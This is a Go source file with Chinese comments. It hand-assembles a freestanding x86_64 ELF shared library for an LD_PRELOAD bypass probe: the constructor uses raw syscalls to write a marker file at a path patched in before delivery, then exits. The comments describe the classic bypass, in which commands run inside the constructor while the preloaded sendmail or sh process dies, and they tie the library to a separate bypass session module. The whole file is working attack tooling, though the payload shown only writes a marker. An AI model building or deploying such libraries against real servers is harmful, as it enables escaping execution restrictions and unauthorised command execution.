// ldpreloadgen 离线生成 session/ldpreload_x86_64.so:freestanding x86_64 ELF
// 共享库,构造器(DT_INIT_ARRAY）用纯 syscall 往「路径槽」指定的文件写一个字节
// 探活标记后 _exit(0)——「加载即证明」的最小可行 LD_PRELOAD 绕过探针（复盘 R1,
// 用法见 session/bypass.go)。无 libc 依赖，无外部工具链依赖（构建主机不需要
// as/ld/gcc):ELF 头/程序头/动态节/机器码全部由本生成器按布局常量直接产出。
//
// 用法（构建期外手工运行，产物随仓库提交）:
//
//	go run ./session/ldpreloadgen
//
// 布局（vaddr == file offset,两段 PT_LOAD 页对齐）:
//
//	RX 段（off 0):ELF header(64B) + 3×Phdr(56B) + 构造器机器码（off 0x100)
//	RW 段（off 0x1000):init_array → dynamic[8] → sysv hash → strtab →
//	  symtab（空） → 路径槽 magic(16B) → 路径槽（128B,投递前改写） → 标记字节
//
// 构造器机器码（裸 syscall，目标侧任何 glibc/musl 动态链接器加载即执行）:
//
//	open(path, O_WRONLY|O_CREAT|O_TRUNC, 0644)   ; rax=2
//	write(fd, marker, 1)                          ; rax=1
//	_exit(0)                                      ; rax=60
//
// _exit(0) 同时挡掉被 preload 的 sendmail/sh 本体——这正是 LD_PRELOAD 绕过的
// 经典语义：子进程加载即死，命令执行全在构造器里完成（本探针只写标记）。
package main

import (
	"encoding/binary"
	"fmt"
	"os"
	"path/filepath"
)

const (
	pageSize   = 0x1000
	codeOff    = 0x100  // 构造器在 RX 段的偏移（= vaddr)
	rwOff      = 0x1000 // RW 段偏移（= vaddr)
	rxFileSz   = 0x200  // RX 段 filesz（对齐余量）
	magicOff   = 0x10C0 // 路径槽 magic 在 RW 段的 vaddr
	pathOff    = 0x10D0 // 路径槽 vaddr(magic 后）
	pathLen    = 128
	markerOff  = 0x1150 // 标记字节 vaddr
	rwFileSz   = 0x1151
	dynOff     = 0x1010 // dynamic 节 vaddr
	dynCount   = 8
	hashOff    = 0x1090
	strtabOff  = 0x10A4
	symtabOff  = 0x10A8
	initArrOff = 0x1000
)

var magic = []byte("ARTEXLDPATHv1\x00\x00\x00") // 16B,与 session/bypass.go 一致

// constructor 产出构造器机器码。rip 相对寻址的 disp 由布局常量计算，不写死。
func constructor() []byte {
	var c []byte
	emit := func(b ...byte) { c = append(c, b...) }
	rip := func() int { return codeOff + len(c) } // 当前写入位置的 vaddr

	emit(0xB8, 0x02, 0x00, 0x00, 0x00) // mov eax, 2 (sys_open)
	// lea rdi, [rip+disp]:disp = pathOff - 本指令结束地址
	emit(0x48, 0x8D, 0x3D)
	disp1 := int32(pathOff - (rip() + 4))
	var tmp [4]byte
	binary.LittleEndian.PutUint32(tmp[:], uint32(disp1))
	emit(tmp[:]...)
	emit(0xBE, 0x41, 0x02, 0x00, 0x00) // mov esi, 0x241 (O_WRONLY|O_CREAT|O_TRUNC)
	emit(0xBA, 0xA4, 0x01, 0x00, 0x00) // mov edx, 0x1A4 (0644)
	emit(0x0F, 0x05)                   // syscall → fd in rax
	emit(0x48, 0x89, 0xC7)             // mov rdi, rax (fd)
	emit(0xB8, 0x01, 0x00, 0x00, 0x00) // mov eax, 1 (sys_write)
	emit(0x48, 0x8D, 0x35)             // lea rsi, [rip+disp]
	disp2 := int32(markerOff - (rip() + 4))
	binary.LittleEndian.PutUint32(tmp[:], uint32(disp2))
	emit(tmp[:]...)
	emit(0xBA, 0x01, 0x00, 0x00, 0x00) // mov edx, 1
	emit(0x0F, 0x05)                   // syscall
	emit(0xB8, 0x3C, 0x00, 0x00, 0x00) // mov eax, 60 (sys_exit)
	emit(0x31, 0xFF)                   // xor edi, edi
	emit(0x0F, 0x05)                   // syscall
	emit(0xC3)                         // ret（不可达，保险）
	return c
}

func main() {
	code := constructor()
	if codeOff+len(code) > rxFileSz {
		fatalf("构造器机器码 %d 字节超出 RX 段预留 %d", len(code), rxFileSz-codeOff)
	}

	out := make([]byte, rwOff+rwFileSz)

	// ---- ELF header ----
	copy(out[0:], []byte{0x7F, 'E', 'L', 'F', 2, 1, 1, 0}) // 64-bit LE
	binary.LittleEndian.PutUint16(out[16:], 3)             // e_type = ET_DYN
	binary.LittleEndian.PutUint16(out[18:], 62)            // e_machine = EM_X86_64
	binary.LittleEndian.PutUint32(out[20:], 1)             // e_version
	binary.LittleEndian.PutUint64(out[32:], 64)            // e_phoff
	binary.LittleEndian.PutUint16(out[52:], 64)            // e_ehsize
	binary.LittleEndian.PutUint16(out[54:], 56)            // e_phentsize
	binary.LittleEndian.PutUint16(out[56:], 3)             // e_phnum

	// ---- program headers ----
	ph := func(i int, ptype, flags uint32, off, vaddr, filesz, memsz, align uint64) {
		b := out[64+i*56:]
		binary.LittleEndian.PutUint32(b[0:], ptype)
		binary.LittleEndian.PutUint32(b[4:], flags)
		binary.LittleEndian.PutUint64(b[8:], off)
		binary.LittleEndian.PutUint64(b[16:], vaddr)
		binary.LittleEndian.PutUint64(b[24:], vaddr) // p_paddr 同 vaddr
		binary.LittleEndian.PutUint64(b[32:], filesz)
		binary.LittleEndian.PutUint64(b[40:], memsz)
		binary.LittleEndian.PutUint64(b[48:], align)
	}
	ph(0, 1, 5, 0, 0, rxFileSz, rxFileSz, pageSize)          // PT_LOAD R+X
	ph(1, 1, 6, rwOff, rwOff, rwFileSz, rwFileSz, pageSize)  // PT_LOAD R+W
	ph(2, 2, 6, dynOff, dynOff, dynCount*16, dynCount*16, 8) // PT_DYNAMIC

	// ---- 构造器机器码 ----
	copy(out[codeOff:], code)

	// ---- RW 段 ----
	binary.LittleEndian.PutUint64(out[initArrOff:], codeOff) // DT_INIT_ARRAY → 构造器

	dyn := func(i int, tag, val uint64) {
		b := out[dynOff+i*16:]
		binary.LittleEndian.PutUint64(b[0:], tag)
		binary.LittleEndian.PutUint64(b[8:], val)
	}
	dyn(0, 4, hashOff)     // DT_HASH
	dyn(1, 5, strtabOff)   // DT_STRTAB
	dyn(2, 6, symtabOff)   // DT_SYMTAB
	dyn(3, 10, 1)          // DT_STRSZ
	dyn(4, 11, 24)         // DT_SYMENT
	dyn(5, 25, initArrOff) // DT_INIT_ARRAY
	dyn(6, 27, 8)          // DT_INIT_ARRAYSZ
	dyn(7, 0, 0)           // DT_NULL

	// sysv hash:nbucket=1, nchain=1, 全空（本库不导出符号）。
	binary.LittleEndian.PutUint32(out[hashOff:], 1)
	binary.LittleEndian.PutUint32(out[hashOff+4:], 1)
	// strtab 仅 "\0";symtab 仅一个全零空符号（24B)——make 已置零。

	copy(out[magicOff:], magic)
	// 路径槽（128B）默认全零：投递前由 session/bypass.go 改写为探活标记路径。
	out[markerOff] = 'K'

	dst := filepath.Join("session", "ldpreload_x86_64.so")
	if len(os.Args) > 1 {
		dst = os.Args[1] // 允许显式输出路径（测试/再生成）
	}
	if err := os.WriteFile(dst, out, 0o644); err != nil {
		fatalf("写入 %s: %v", dst, err)
	}
	fmt.Printf("已生成 %s(%d 字节,构造器 %d 字节 @ vaddr 0x%x)\n", dst, len(out), len(code), codeOff)
}

func fatalf(format string, args ...any) {
	fmt.Fprintf(os.Stderr, "ldpreloadgen: "+format+"\n", args...)
	os.Exit(1)
}
